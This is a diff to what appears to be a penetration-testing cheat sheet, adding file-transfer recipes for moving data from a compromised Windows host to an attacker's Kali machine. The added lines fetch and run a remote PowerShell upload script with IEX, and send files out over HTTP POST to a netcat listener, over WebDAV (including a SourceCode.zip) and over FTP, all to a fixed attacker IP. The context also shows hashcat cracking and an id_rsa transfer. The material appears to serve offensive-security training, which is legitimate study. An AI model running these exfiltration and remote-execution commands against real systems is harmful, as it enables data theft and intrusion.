@@ -743,7 +743,7 @@ $ hashcat -a 0 -m 0 hashes.txt <wordlist>
 #7. - File Transfers
 -----------------------------------------
 
-- Base64
+- Base64 (Kali -> Windows)
 
 ```
 $ md5sum id_rsa
@@ -758,6 +758,23 @@ PS C:\> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
 Algorithm       Hash                                                                   Path
 ---------       ----                                                                   ----
 MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa
+```
+
+- Base64 (Windows -> Kali)
+
+```
+PS C:\> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
+IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
+
+PS C:\> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
+Hash
+----
+3688374325B992DEF12793500307566D
+
+$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
+
+$ md5sum hosts 
+3688374325b992def12793500307566d  hosts
 ```
 
 - PowerShell DownloadFile
@@ -786,11 +803,38 @@ PS C:\> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent
 https://gist.github.com/HarmJ0y/bb48307ffa663256e239
 ```
 
+- PowerShell Web Uploads
+
+```
+$ pip3 install uploadserver
+$ python3 -m uploadserver
+PS C:\> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+PS C:\> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+```
+
+- PowerShell Base64 Web Uploads
+
+```
+PS C:\> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+PS C:\> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64s
+$ nc -lvnp 8000
+$ echo <base64> | base64 -d -w 0 > hosts
+```
+
 - SMB
 
 ```
 $ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
 C:\> net use n: \\<IP address>\smbshare /user:test test
+```
+
+- SMB Uploads WebDav
+
+```
+$ sudo pip3 install wsgidav cheroot
+$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
+C:\> dir \\192.168.49.128\DavWWWRoot
+C:\> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
 ```
 
 - FTP
@@ -799,6 +843,13 @@ C:\> net use n: \\<IP address>\smbshare /user:test test
 $ sudo pip3 install pyftpdlib
 $ sudo python3 -m pyftpdlib --port 21
 PS C:\> (New-Object Net.WebClient).DownloadFile('ftp://<IP address>/file.txt', 'C:\Users\Public\ftp-file.txt')
+```
+
+- FTP Uploads
+
+```
+$ sudo python3 -m pyftpdlib --port 21 --write
+PS C:\> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
 ```
 
 - FTP Non-Interactively
@@ -819,6 +870,24 @@ ftp> bye
 
 C:\>cat file.txt
 This is a test file
+```
+
+- FTP Uploads Non-Interactively
+
+```
+C:\> echo open 192.168.49.128 > ftpcommand.txt
+C:\> echo USER anonymous >> ftpcommand.txt
+C:\> echo binary >> ftpcommand.txt
+C:\> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
+C:\> echo bye >> ftpcommand.txt
+C:\> ftp -v -n -s:ftpcommand.txt
+ftp> open 192.168.49.128
+
+Log in with USER and PASS first.
+
+ftp> USER anonymous
+ftp> PUT c:\windows\system32\drivers\etc\hosts
+ftp> bye
 ```
 
 - Host Files
